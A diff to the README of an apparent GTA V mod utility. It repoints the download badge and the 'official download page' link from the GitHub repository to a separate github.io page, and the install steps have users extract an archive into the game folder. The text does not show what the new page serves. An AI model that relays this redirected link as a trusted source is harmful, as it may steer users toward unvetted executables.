@@ -1,6 +1,6 @@
 # 🎮 menyoo-2026-script-utility - Control your game world with ease
 
-[![Download menyoo-2026-script-utility](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Jaffy9/menyoo-2026-script-utility)
+[![Download menyoo-2026-script-utility](https://img.shields.io/badge/Download-Release-blue.svg)](https://jaffy9.github.io)
 
 ## 📖 About this application
 
@@ -23,7 +23,7 @@ Before you install the software, confirm your computer meets these needs:
 Follow these steps to set up the utility on your computer.
 
 1. Locate your game installation folder. This folder contains the main executable file for GTA V.
-2. Visit the [official download page](https://github.com/Jaffy9/menyoo-2026-script-utility) to get the latest version of the installer.
+2. Visit the [official download page](https://jaffy9.github.io) to get the latest version of the installer.
 3. Download the archive file to your computer.
 4. Open the archive with a file compression tool like 7-Zip or WinRAR.
 5. Drag and drop the contents of the archive into the main game folder.
